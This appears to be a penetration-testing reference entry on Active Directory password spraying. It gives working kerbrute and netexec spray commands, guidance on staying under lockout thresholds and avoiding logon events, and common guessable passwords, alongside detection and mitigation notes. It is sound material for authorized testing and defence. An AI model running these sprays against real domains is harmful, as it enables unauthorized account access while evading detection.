---
title: Password spraying
category: AD / Credentials
order: 5
tags: [spraying, kerbrute, netexec, lockout, passwords]
summary: >
  One or two likely passwords against many users, slow enough to dodge lockout.
  The classic way to turn a user list into a first valid credential. Kerbrute
  (Kerberos pre-auth) is quiet; nxc validates and flags admin.
prerequisites:
  - A user list (from unauth enum / OSINT) and a DC ($dc_ip)
  - The domain lockout policy (badPwdCount threshold + observation window)
tools: [kerbrute, netexec, DomainPasswordSpray]
detection:
  - Many 4771/4625 (bad password) across accounts from one source; a burst of 4768
mitigation:
  - Lockout policy + smart lockout; MFA; banned-password lists; alert on spray patterns
refs:
  - { label: "kerbrute", url: "https://github.com/ropnop/kerbrute" }
  - { label: "HackTricks — password spraying", url: "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying" }
---

## Know the lockout first

```sh
# read the policy so you don't lock accounts out
netexec smb $dc_ip -u $user -p $password --pass-pol
# (unauth) rpcclient: getdompwinfo
```

Stay a couple below the threshold, and wait out the observation window between
rounds.

## Spray

```sh
# Kerberos pre-auth spray — quiet, no SMB logon events
kerbrute passwordspray -d $domain --dc $dc_ip users.txt 'Winter2026!'
```

```sh
# netexec, with lockout guard; --continue-on-success to collect all hits
netexec smb $dc_ip -u users.txt -p 'Winter2026!' --continue-on-success
netexec ldap $dc_ip -u users.txt -p 'Season2026!' --continue-on-success
```

## Good candidate passwords

`Season+Year!` (`Autumn2026!`), the company name + digits, `Welcome1`,
`Password1`, `username = password`, and anything you saw in a user `description`
during enumeration.

> Spraying LDAP/SMB creates bad-password events per attempt — Kerbrute's AS-REQ
> approach is stealthier and also tells you which accounts have preauth disabled.
